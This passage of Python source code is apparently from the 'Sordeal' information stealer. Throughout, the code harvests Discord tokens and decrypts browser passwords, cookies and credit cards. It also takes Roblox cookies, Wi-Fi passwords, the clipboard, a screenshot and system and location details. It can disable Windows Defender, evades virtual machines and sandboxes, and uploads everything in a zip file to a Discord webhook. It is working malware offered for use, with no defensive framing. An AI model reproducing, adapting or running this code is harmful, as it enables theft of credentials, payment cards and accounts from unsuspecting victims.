            + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
            "Chrome5": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
            "Epic Privacy Browser": self.appdata
            + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
            "Microsoft Edge": self.appdata
            + "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
            "Uran": self.appdata
            + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
            "Yandex": self.appdata
            + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
            "Brave": self.appdata
            + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
            "Iridium": self.appdata
            + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f"\\{disc}\\Local State"):
                    for filname in os.listdir(path):
                        if filname[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [
                            x.strip()
                            for x in open(
                                f"{path}\\{filname}", errors="ignore"
                            ).readlines()
                            if x.strip()
                        ]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.value_dcrypt(
                                        base64.b64decode(y.split("dQw4w9WgXcQ:")[1]),
                                        self.MasterKey_find(
                                            self.roaming + f"\\{disc}\\Local State"
                                        ),
                                    )
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(
                                        self.baseurl,
                                        headers={
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                            "Content-Type": "application/json",
                                            "Authorization": token,
                                        },
                                    )
                                except Exception:
                                    pass
                                if r.status_code == 200:
                                    uid = r.json()["id"]
                                    if uid not in self.SO_id:
                                        self.tokens.append(token)
                                        self.SO_id.append(uid)
            else:
                for filname in os.listdir(path):
                    if filname[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [
                        x.strip()
                        for x in open(f"{path}\\{filname}", errors="ignore").readlines()
                        if x.strip()
                    ]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(
                                    self.baseurl,
                                    headers={
                                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                        "Content-Type": "application/json",
                                        "Authorization": token,
                                    },
                                )
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()["id"]
                                if uid not in self.SO_id:
                                    self.tokens.append(token)
                                    self.SO_id.append(uid)
        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(
                self.roaming + "\\Mozilla\\Firefox\\Profiles"
            ):
                for _file in files:
                    if not _file.endswith(".sqlite"):
                        continue
                    for line in [
                        x.strip()
                        for x in open(f"{path}\\{_file}", errors="ignore").readlines()
                        if x.strip()
                    ]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(
                                    self.baseurl,
                                    headers={
                                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                        "Content-Type": "application/json",
                                        "Authorization": token,
                                    },
                                )
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()["id"]
                                if uid not in self.SO_id:
                                    self.tokens.append(token)
                                    self.SO_id.append(uid)

    def random_dir_create(self, _dir: str or os.PathLike = gettempdir()):
        filname = "".join(
            random.SystemRandom().choice(
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            )
            for _ in range(random.randint(10, 20))
        )
        path = ntpath.join(_dir, filname)
        open(path, "x")
        return path

    @extract_try
    def steal_mypassword2(self, name: str, path: str, profile: str):
        if self.ineedtogetbrowsers == "yes":
            path += "\\" + profile + "\\Login Data"
            if not os.path.isfile(path):
                return
            loginvault = self.random_dir_create()
            copy2(path, loginvault)
            conn = sqlite3.connect(loginvault)
            cursor = conn.cursor()
            with open(
                ntpath.join(self.dir, "Browsers", "Browsers Passwords.txt"),
                "a",
                encoding="utf-8",
            ) as f:
                for res in cursor.execute(
                    f"{self.thecommand}"
                ).fetchall():
                    url, username, password = res
                    password = self.value_decrypt(password, self.masterkey)
                    if url != "":
                        f.write(f"URL: {url}\nID: {username}\nPASSW0RD: {password}\n\n")
            cursor.close()
            conn.close()
            os.remove(loginvault)
        
            self.thingstocount['Pssw'] += len(password)

        else: 
            pass

    @extract_try
    def steal_cookies2(self, name: str, path: str, profile: str):
        if self.ineedtogetbrowsers == "yes":
            path += "\\" + profile + "\\Network\\Cookies"
            if not os.path.isfile(path):
                return
            cookievault = self.random_dir_create()
            copy2(path, cookievault)
            conn = sqlite3.connect(cookievault)
            cursor = conn.cursor()
            with open(
                ntpath.join(self.dir, "Browsers", "Browsers Cookies.txt"),
                "a",
                encoding="utf-8",
            ) as f:
                for res in cursor.execute(
                    "SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies"
                ).fetchall():
                    host_key, name, path, encrypted_value, expires_utc = res
                    value = self.value_decrypt(encrypted_value, self.masterkey)
                    if host_key and name and value != "":
                        f.write(
                            "{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
                                host_key,
                                "FALSE" if expires_utc == 0 else "TRUE",
                                path,
                                "FALSE" if host_key.startswith(".") else "TRUE",
                                expires_utc,
                                name,
                                value,
                            )
                       )
            cursor.close()
            conn.close()
            os.remove(cookievault)
        else:
            pass

    @extract_try
    def steal_passwords(self):
        if self.ineedtogetbrowsers == "yes":
            f = open(
                ntpath.join(self.dir, "Google", "Passwords.txt"),
                "w",
                encoding="cp437",
                errors="ignore",
            )
            for prof in os.listdir(self.chrmmuserdtt):
                if re.match(self.chrmrgx, prof):
                    login_db = ntpath.join(self.chrmmuserdtt, prof, "Login Data")
                    login = self.files_creating()

                    shutil.copy2(login_db, login)
                    conn = sqlite3.connect(login)
                    cursor = conn.cursor()
                    cursor.execute(
                        "SELECT action_url, username_value, password_value FROM logins"
                    )

                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = self.value_decrypt(
                            encrypted_password, self.chrome_key
                        )
                        if url != "":
                            f.write(
                                f"URL: {url}\nID: {username}\nPASSW0RD: {decrypted_password}\n\n"
                            )
                    cursor.close()
                    conn.close()
                    os.remove(login)
            f.close()
            self.thingstocount['Pssw'] += len(decrypted_password)
        else:
            pass



    @extract_try
    def steal_cookies(self):
        if self.ineedtogetbrowsers == "yes":
            f = open(
                ntpath.join(self.dir, "Google", "Cookies.txt"),
                "w",
                encoding="cp437",
                errors="ignore",
            )
            for prof in os.listdir(self.chrmmuserdtt):
                if re.match(self.chrmrgx, prof):
                    login_db = ntpath.join(self.chrmmuserdtt, prof, "Network", "cookies")
                    login = self.files_creating()

                    shutil.copy2(login_db, login)
                    conn = sqlite3.connect(login)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value from cookies")

                    for r in cursor.fetchall():
                        host = r[0]
                        user = r[1]
                        decrypted_cookie = self.value_decrypt(r[2], self.chrome_key)
                        if host != "":
                            f.write(
                                f"{host}	TRUE"
                                + "		"
                                + f"/FALSE	2597573456	{user}	{decrypted_cookie}\n"
                            )
                        if (
                            "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
                            in decrypted_cookie
                        ):
                            self.robloxcookies.append(decrypted_cookie)
                    cursor.close()
                    conn.close()
                    os.remove(login)
            f.close()
            self.thingstocount['Rblx_Cooks'] += len(self.robloxcookies)
        else:
            pass

    def steal_history2(self, name: str, path: str, profile: str):
        
        if self.ineedtogetbrowsers == "yes":
            path += "\\" + profile + "\\History"
            if not os.path.isfile(path):
                return
            historyvault = self.random_dir_create()
            copy2(path, historyvault)
            conn = sqlite3.connect(historyvault)
            cursor = conn.cursor()
            with open(
                ntpath.join(self.dir, "Browsers", "Browsers History.txt"),
                "a",
                encoding="utf-8",
            ) as f:
                sites = []
                for res in cursor.execute(
                    "SELECT url, title, visit_count, last_visit_time FROM urls"
                ).fetchall():
                    url, title, visit_count, last_visit_time = res
                    if url and title and visit_count and last_visit_time != "":
                        sites.append((url, title, visit_count, last_visit_time))
                sites.sort(key=lambda x: x[3], reverse=True)
                self.thingstocount['Hist'] += len(sites)
                for site in sites:
                    f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))
            cursor.close()
            conn.close()
            os.remove(historyvault)
        else:
            pass

    def steal_cc2(self, name: str, path: str, profile: str):
        if self.ineedtogetbrowsers == "yes":
            path += "\\" + profile + "\\Web Data"
            if not os.path.isfile(path):
                return
            cc_vaults = self.random_dir_create()
            copy2(path, cc_vaults)
            conn = sqlite3.connect(cc_vaults)
            cursor = conn.cursor()
            with open(
                ntpath.join(self.dir, "Browsers", "Browsers CC.txt"), "a", encoding="utf-8"
            ) as f:
                for res in cursor.execute(
                    "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
                ).fetchall():
                    name_on_cc, expir_on_cc, expir_year_cc, number_onmy_cc = res
                    if name_on_cc and number_onmy_cc != "":
                        f.write(
                            f"Name: {name_on_cc}   Expiration Month: {expir_on_cc}   Expiration Year: {expir_year_cc}   Card Number: {self.value_decrypt(number_onmy_cc, self.masterkey)}\n"
                        )
            f.close()
            cursor.close()
            conn.close()
            os.remove(cc_vaults)
            self.thingstocount['CC'] += len(name_on_cc)
        else:
            pass



    @extract_try
    def steal_history(self):
        
        if self.ineedtogetbrowsers == "yes":
            f = open(
                ntpath.join(self.dir, "Google", "History.txt"),
                "w",
                encoding="cp437",
                errors="ignore",
            )

            def so_pleaseextract(db_cursor):
                _net = ""
                db_cursor.execute("SELECT title, url, last_visit_time FROM urls")
                for item in db_cursor.fetchall():
                    _net += f"Search Title: {item[0]}\nURL: {item[1]}\nLAST VISIT TIME: {self.time_convertion(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"
                return _net

            def so_pleaseextractwebsearch(db_cursor):
                db_cursor.execute("SELECT term FROM keyword_search_terms")
                search_terms = ""

                for item in db_cursor.fetchall():
                    if item[0] != "":
                        search_terms += f"{item[0]}\n"
                return search_terms

            for prof in os.listdir(self.chrmmuserdtt):
                if re.match(self.chrmrgx, prof):
                    login_db = ntpath.join(self.chrmmuserdtt, prof, "History")
                    login = self.files_creating()

                    shutil.copy2(login_db, login)
                    conn = sqlite3.connect(login)
                    cursor = conn.cursor()

                    search_history = so_pleaseextractwebsearch(cursor)
                    web_history = so_pleaseextract(cursor)

                    f.write(
                        f"{' '*17}SEARCH\n{'-'*50}\n{search_history}\n{' '*17}\n\nLinks History\n{'-'*50}\n{web_history}"
                    )
                
                    self.thingstocount['Hist'] += len(search_history)
                    cursor.close()
                    conn.close()
                    os.remove(login)
            f.close()
        else:
            pass

    def natify_matched_tokens(self):
        f = open(
            self.dir + "\\Discord_Info.txt", "w", encoding="cp437", errors="ignore"
        )

        for token in self.tokens:
            j = httpx.get(self.dscap1, headers=self.header_making(token)).json()
            user = j.get("username") + "#" + str(j.get("discriminator"))

            disc_badg = ""
            flags = j["flags"]
            if flags == 1:
                disc_badg += "Staff, "
            if flags == 2:
                disc_badg += "Partner, "
            if flags == 4:
                disc_badg += "Hypesquad Event, "
            if flags == 8:
                disc_badg += "Green Bughunter, "
            if flags == 64:
                disc_badg += "Hypesquad Bravery, "
            if flags == 128:
                disc_badg += "HypeSquad Brillance, "
            if flags == 256:
                disc_badg += "HypeSquad Balance, "
            if flags == 512:
                disc_badg += "Early Supporter, "
            if flags == 16384:
                disc_badg += "Gold BugHunter, "
            if flags == 131072:
                disc_badg += "Verified Bot Developer, "
            if flags == 4194304:
                disc_badg += "Active Developer, "
            if disc_badg == "":
                disc_badg = "None"
            email = j.get("email")
            phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
            nitro_data = httpx.get(
                self.dscap1 + "/billing/subscriptions",
                headers=self.header_making(token),
            ).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(
                len(
                    json.loads(
                        httpx.get(
                            self.dscap1 + "/billing/payment-sources",
                            headers=self.header_making(token),
                        ).text
                    )
                )
                > 0
            )

            f.write(
                f"{' '*17}{user}\n{'-'*50}\nBilling: {billing}\nNitro: {has_nitro}\nBadges: {disc_badg}\nPhone: {phone}\nToken: {token}\nEmail: {email}\n\n"
            )
        f.close()
        
        self.thingstocount['Disco_info'] += len(self.tokens)

    def mc_find(self) -> None:
        
        if self.ineedtogetmc == "yes":
            if not os.path.exists(mcdir := ntpath.join(self.roaming, '.minecraft')) or not os.path.isfile(ntpath.join(mcdir, 'launcher_profiles.json')):
                return
            for i in os.listdir(mcdir):
                if not i.endswith((".json", ".txt", ".dat")):
                    continue
                os.makedirs(pathtoget := ntpath.join(self.dir, "Minecraft"), exist_ok= True)
                shutil.copy2(ntpath.join(mcdir, i), ntpath.join(pathtoget, i))
                dir_path = fr"{self.dir}/Minecraft"
                count = 0
                for path in os.listdir(dir_path):
                    if os.path.isfile(ntpath.join(dir_path, path)):
                        count += 1
                self.thingstocount['Minecraft'] += count
        else:
            pass


    
    def getmyclipboard(self):
        if self.ineedtogetclipboard == "yes":
            output = Functions.so_findClipboard()
            if len(output) > 0:
                with open(ntpath.join(self.dir, 'Systeme', 'Latest Clipboard.txt'), 'w', encoding= 'utf-8', errors= 'ignore') as file:
                    file.write("Sordeal | https://github.com/Sordeal/Sordeal-Stealer\n\n" + output)


    
    def so_please_getmyAV(self):
        if self.ineedtogetav == "yes":
            output = subprocess.run('WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName', capture_output= True, shell= True)
            if not output.returncode:
                output = output.stdout.decode(errors= 'ignore').strip().replace('\r\n', '\n').splitlines()
                if len(output) >= 2:
                    output = output[1:]
                    with open(ntpath.join(self.dir, 'Systeme', 'Anti Virus.txt'), 'w', encoding= 'utf-8', errors= 'ignore') as file:
                       file.write('\n'.join(output))
                    
                    
                    
    def so_please_disabledefender(self):
        if self.disablemydefender == "yes":
            try:
                subprocess.run(self.command_disable, shell=True, capture_output=True)
            except Exception:
                return
            
    @extract_try
    def getmywifiSordeal(self):
        
        if self.ineedtogetwifipassword == "yes":
            self.passwords = Functions.so_findwifi()
            self.profiles = list()
            for wifiprofil, pssw in self.passwords.items():
                self.profiles.append(f'SSID: {wifiprofil}\nPASSW0RD: {pssw}')
            divider = '\n\n' + 'Sordeal | https://github.com/Sordeal/Sordeal-Stealer'+ '\n\n'
            with open(ntpath.join(self.dir, 'Systeme', 'Wifi Info.txt'), "w", encoding= 'utf-8', errors= 'ignore') as file:
                file.write(divider.lstrip() + divider.join(self.profiles))
            self.thingstocount['Wifi'] += len(self.profiles)
        else:
            pass
    

    def find_roblox(self):
        if self.ineedtogetrblx == "yes":
            def subproc(path):
                try:
                    return (
                        subprocess.check_output(
                            rf"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
                            creationflags=0x08000000,
                        )
                        .decode()
                        .rstrip()
                    )
                except Exception:
                    return None

            reg_cookie = subproc(r"HKLM")
            if not reg_cookie:
                reg_cookie = subproc(r"HKCU")
            if reg_cookie:
                self.robloxcookies.append(reg_cookie)
            if self.robloxcookies:
                with open(self.dir + "\\Roblox\\Roblox_Cookies.txt", "w") as f:
                    for i in self.robloxcookies:
                        f.write(i + "\n")

        else:
            pass

    def screentimes(self):
        
        if self.ineedtogetscreen == "yes":
            image = ImageGrab.grab(
                bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None
            )
            image.save(self.dir + "\\Systeme\\Screenshot.png")
            image.close()
        else:
            pass

    def system_informations(self):
        if self.ineedtogetsys == "yes":
            about = f"""
{login_info} | {computer_victim}
Windows key: {self.key_windows_find}
Windows version: {self.never_wind}
RAM: {fast_memory_storage}GB
DISK: {storage_space}GB
HWID: {self.windows_uuid}
IP: {self.ip}
City: {self.city}
Country: {self.country}
Region: {self.region}
Org: {self.org}
GoogleMaps: {self.googlemap}
            """
            with open(
                self.dir + "\\Systeme\\System_Info.txt", "w", encoding="utf-8", errors="ignore"
            ) as f:
                f.write(about)
        else:
            pass

    def finished_bc(self):
        for i in os.listdir(self.dir):
            if i.endswith(".txt"):
                path = self.dir + self.sep + i
                with open(path, "r", errors="ignore") as ff:
                    x = ff.read()
                    if not x:
                        ff.close()
                        os.remove(path)
                    else:
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write(
                                "SORDEAL Create By SHAMAN SOVIETIC | https://github.com/Sordeal\n\n"
                            )
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(
                                x
                                + "\n\nSORDEAL Create By SHAMAN SOVIETIC | https://github.com/Sordeal"
                            )
        _zipfile = ntpath.join(self.appdata,  f"{self.getlange()}SORDEAL_[{login_info}].zip")
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        path_src = ntpath.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                absname = ntpath.abspath(ntpath.join(dirname, filename))
                arcname = absname[len(path_src) + 1 :]
                zipped_file.write(absname, arcname)
        zipped_file.close()

        file_count, files_found, tokens = 0, "", ""
        for _, __, files in os.walk(self.dir):
            for _file in files:
                files_found += f"- {_file}\n"
                file_count += 1
        for tkn in self.tokens:
            tokens += f"{tkn}\n\n"
        fileCount = f"{file_count} SORDEALISED FILES: "
        embed = {
            "name": "Sordeal",
            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
            "embeds": [
                {
                    "author": {
                        "name": f"SORDEAL v3",
                        "url": "https://github.com/Sordeal",
                        "icon_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/output-onlinegiftools.gif",
                    },
                    "color": 16711718,
                    "description": f"[$1nt4X ON TOP]({self.googlemap})",
                    "fields": [
                        {
                            "name": "\u200b",
                            "value": f"""```ansi
[2;40m[2;47m[2;42m[2;41m[2;45mIP:[0m[2;41m[0m[2;42m[0m[2;47m[0m[2;40m[0m[2;34m[2;31m {self.ip if self.ip else "N/A"}[0m[2;34m[0m
[2;40m[2;47m[2;42m[2;41m[2;45mOrg:[0m[2;41m[0m[2;42m[0m[2;47m[0m[2;40m[0m[2;34m[2;31m {self.org if self.org else "N/A"}[0m[2;34m[0m
[2;40m[2;47m[2;42m[2;41m[2;45mCity:[0m[2;41m[0m[2;42m[0m[2;47m[0m[2;40m[0m[2;34m[2;31m {self.city if self.city else "N/A"}[0m[2;34m[0m
[2;40m[2;47m[2;42m[2;41m[2;45mRegion:[0m[2;41m[0m[2;42m[0m[2;47m[0m[2;40m[0m[2;34m[2;31m {self.region if self.region else "N/A"}[0m[2;34m[0m
[2;40m[2;47m[2;42m[2;41m[2;45mCountry:[0m[2;41m[0m[2;42m[0m[2;47m[0m[2;40m[0m[2;34m[2;31m {self.country if self.country else "N/A"}[0m[2;34m[0m
```
                            """.replace(
                                " ", " "
                            ),
                            "inline": False,
                        },
                        {
                            "name": "\u200b",
                            "value": f"""```markdown
                                # Computer Name: {computer_victim.replace(" ", " ")}
                                # Windows Key: {self.key_windows_find.replace(" ", " ")}
                                # Windows Ver: {self.never_wind.replace(" ", " ")}
                                # Disk Stockage: {storage_space}GB
                                # Ram Stockage: {fast_memory_storage}GB```
                            """.replace(
                                " ", ""
                            ),
                            "inline": True,
                        },
                        {
                            "name": "\u200b",
                            "value": f"""```markdown
                                # Cookies Found: {self.thingstocount['Cooks']}
                                # Passwords Found: {self.thingstocount['Pssw']}
                                # Credit Card Found: {self.thingstocount['CC']}
                                # History Found: {self.thingstocount['Hist']}
                                # Discord Tokens Found: {self.thingstocount['Disco_info']}
                                # Roblox Cookies Found: {self.thingstocount['Rblx_Cooks']}
                                # Minecraft Tokens Found: {self.thingstocount['Minecraft']}
                                # Wifi Passwords Found: {self.thingstocount['Wifi']}
                                ```
                            """.replace(
                                " ", ""
                            ),
                            "inline": True,
                        },
                        {
                            "name": fileCount,
                            "value": f"""```markdown
                                {files_found.strip().replace("_", ' ')}
                                ```
                            """.replace(
                                " ", ""
                            ),
                            "inline": False,
                        },
                        {
                            "name": "**- Valid Tokens Found:**",
                            "value": f"""```yaml
{tokens if tokens else "tokens not found"}```
                            """.replace(
                                " ", " "
                            ),
                            "inline": False,
                        },
                        
                    ],
                    "footer": {
                        "text": "SORDEAL Create BY SHAMAN・https://github.com/Sordeal"
                    },
                }
            ],
        }

        with open(_zipfile, "rb") as f:
            if self.regex_webhook_dsc in self.discord_webhook:
                httpx.post(self.discord_webhook, json=embed)
                httpx.post(self.discord_webhook, files={"upload_file": f})
        os.remove(_zipfile)


class NoDebugg(Functions):
    inVM = False

    def __init__(self):
        self.processes = list()

        self.users_blocked = [
            "WDAGUtilityAccount",
            "BvJChRPnsxn",
            "Harry Johnson",
            "SqgFOf3G",
            "RGzcBUyrznReg",
            "h7dk1xPr",
            "Robert",
            "Abby",
            "Peter Wilson",
            "hmarc",
            "patex",
            "JOHN-PC",
            "RDhJ0CNFevzX",
            "kEecfMwgj",
            "Frank",
            "8Nl0ColNQ5bq",
            "Lisa",
            "John",
            "george",
            "PxmdUOpVyx",
            "8VizSM",
            "w0fjuOVmCcP5A",
            "lmVwjj9b",
            "PqONjHVwexsS",
            "3u2v9m8",
            "Julia",
            "HEUeRzl",
        ]
        self.pcname_blocked = [
            "DESKTOP-CDLNVOQ",
            "BEE7370C-8C0C-4",
            "DESKTOP-NAKFFMT",
            "WIN-5E07COS9ALR",
            "B30F0242-1C6A-4",
            "DESKTOP-VRSQLAG",
            "Q9IATRKPRH",
            "XC64ZB",
            "DESKTOP-D019GDM",
            "DESKTOP-WI8CLET",
            "SERVER1",
            "LISA-PC",
            "JOHN-PC",
            "DESKTOP-B0T93D6",
            "DESKTOP-1PYKP29",
            "DESKTOP-1Y2433R",
            "WILEYPC",
            "WORK",
            "6C4E733F-C2D9-4",
            "RALPHS-PC",
            "DESKTOP-WG3MYJS",
            "DESKTOP-7XC6GEZ",
            "DESKTOP-5OV9S0O",
            "QarZhrdBpj",
            "ORELEEPC",
            "ARCHIBALDPC",
            "JULIA-PC",
            "d1bnJkfVlH",
            "DESKTOP-B0T93D6",
        ]
        self.hwid_blocked = [
            "7AB5C494-39F5-4941-9163-47F54D6D5016",
            "032E02B4-0499-05C3-0806-3C0700080009",
            "03DE0294-0480-05DE-1A06-350700080009",
            "11111111-2222-3333-4444-555555555555",
            "6F3CA5EC-BEC9-4A4D-8274-11168F640058",
            "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
            "4C4C4544-0050-3710-8058-CAC04F59344A",
            "00000000-0000-0000-0000-AC1F6BD04972",
            "79AF5279-16CF-4094-9758-F88A616D81B4",
            "5BD24D56-789F-8468-7CDC-CAA7222CC121",
            "49434D53-0200-9065-2500-65902500E439",
            "49434D53-0200-9036-2500-36902500F022",
            "777D84B3-88D1-451C-93E4-D235177420A7",
            "49434D53-0200-9036-2500-369025000C65",
            "B1112042-52E8-E25B-3655-6A4F54155DBF",
            "00000000-0000-0000-0000-AC1F6BD048FE",
            "EB16924B-FB6D-4FA1-8666-17B91F62FB37",
            "A15A930C-8251-9645-AF63-E45AD728C20C",
            "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3",
            "C7D23342-A5D4-68A1-59AC-CF40F735B363",
            "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
            "44B94D56-65AB-DC02-86A0-98143A7423BF",
            "6608003F-ECE4-494E-B07E-1C4615D1D93C",
            "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
            "49434D53-0200-9036-2500-369025003AF0",
            "8B4E8278-525C-7343-B825-280AEBCD3BCB",
            "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
            "BB64E044-87BA-C847-BC0A-C797D1A16A50",
            "2E6FB594-9D55-4424-8E74-CE25A25E36B0",
            "42A82042-3F13-512F-5E3D-6BF4FFFD8518",
        ]
        self.ips_blocked = [
            "88.132.231.71",
            "78.139.8.50",
            "20.99.160.173",
            "88.153.199.169",
            "84.147.62.12",
            "194.154.78.160",
            "92.211.109.160",
            "195.74.76.222",
            "188.105.91.116",
            "34.105.183.68",
            "92.211.55.199",
            "79.104.209.33",
            "95.25.204.90",
            "34.145.89.174",
            "109.74.154.90",
            "109.145.173.169",
            "34.141.146.114",
            "212.119.227.151",
            "195.239.51.59",
            "192.40.57.234",
            "64.124.12.162",
            "34.142.74.220",
            "188.105.91.173",
            "109.74.154.91",
            "34.105.72.241",
            "109.74.154.92",
            "213.33.142.50",
            "109.74.154.91",
            "93.216.75.209",
            "192.87.28.103",
            "88.132.226.203",
            "195.181.175.105",
            "88.132.225.100",
            "92.211.192.144",
            "34.83.46.130",
            "188.105.91.143",
            "34.85.243.241",
            "34.141.245.25",
            "178.239.165.70",
            "84.147.54.113",
            "193.128.114.45",
            "95.25.81.24",
            "92.211.52.62",
            "88.132.227.238",
            "35.199.6.13",
            "80.211.0.97",
            "34.85.253.170",
            "23.128.248.46",
            "35.229.69.227",
            "34.138.96.23",
            "192.211.110.74",
            "35.237.47.12",
            "87.166.50.213",
            "34.253.248.228",
            "212.119.227.167",
            "193.225.193.201",
            "34.145.195.58",
            "34.105.0.27",
            "195.239.51.3",
            "35.192.93.107",
        ]

        for func in [self.last_check, self.keys_regex, self.Check_and_Spec]:
            process = threading.Thread(target=func, daemon=True)
            self.processes.append(process)
            process.start()
        for t in self.processes:
            try:
                t.join()
            except RuntimeError:
                continue

    def programExit(self):
        self.__class__.inVM = True

    def last_check(self):
        for path in [r"D:\Tools", r"D:\OS2", r"D:\NT3X"]:
            if ntpath.exists(path):
                self.programExit()
        for user in self.users_blocked:
            if login_info == user:
                self.programExit()
        for pcName in self.pcname_blocked:
            if computer_victim == pcName:
                self.programExit()
        for pcIP in self.ips_blocked:
            if self.info_netword()[0] == pcIP:
                self.programExit()
        for windows_uuid in self.hwid_blocked:
            if self.info_sys()[0] == windows_uuid:
                self.programExit()

    def Check_and_Spec(self):
        if int(fast_memory_storage) <= 3:
            self.programExit()
        if int(storage_space) <= 120:
            self.programExit()
        if int(psutil.cpu_count()) <= 1:
            self.programExit()

    def keys_regex(self):
        reg1 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
        )
        reg2 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
        )
        if (reg1 and reg2) != 1:
            self.programExit()
        handle = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
        )
        try:
            reg_val = winreg.QueryValueEx(handle, "0")[0]
            if ("VMware" or "VBOX") in reg_val:
                self.programExit()
        finally:
            winreg.CloseKey(handle)


if __name__ == "__main__" and os.name == "nt":
    asyncio.run(first_function_bc().init())
local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
temp = os.getenv("TEMP")
Threadlist = []


def find_in_config(e: str) -> str or bool | None:
    return __config__.get(e)


hook = find_in_config("SO_webhook")


class DATA_BLOB(Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]


def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw


def CryptUnprotectData(encrypted_bytes, entropy=b""):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(
        byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)
    ):
        return GetData(blob_out)


def Value_Dcryptage(buff, master_key=None):
    starts = buff.decode(encoding="utf8", errors="ignore")[:3]
    if starts == "v10" or starts == "v11":
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass


def Requests_loading(methode, url, data="", files="", headers=""):
    for i in range(8):
        try:
            if methode == "POST":
                if data != "":
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != "":
                    r = requests.post(url, files=files)
                    if (
                        r.status_code == 200 or r.status_code == 413
                    ):  # 413 = DATA TO BIG
                        return r
        except:
            pass


def URL_librairy_Loading(hook, data="", files="", headers=""):
    for i in range(8):
        try:
            if headers != "":
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except:
            pass


def Trust(Cookies):
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED


def Reformat(listt):
    e = re.findall("(\w+[a-z])", listt)
    while "https" in e:
        e.remove("https")
    while "com" in e:
        e.remove("com")
